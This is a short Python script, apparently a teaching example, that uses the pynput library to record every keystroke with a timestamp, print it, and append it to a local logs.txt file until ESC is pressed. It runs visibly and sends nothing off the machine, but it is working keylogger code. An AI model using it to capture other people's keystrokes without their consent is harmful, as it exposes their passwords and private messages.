from pynput import keyboard
from datetime import datetime

log_file = "logs.txt"

print("Educational Key Logger Started")
print("Press ESC to stop...\n")

def on_press(key):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)

    log_entry = f"{time} - {key_data}\n"

    print(log_entry.strip())

    with open(log_file, "a") as f:
        f.write(log_entry)

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nKey Logger Stopped.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
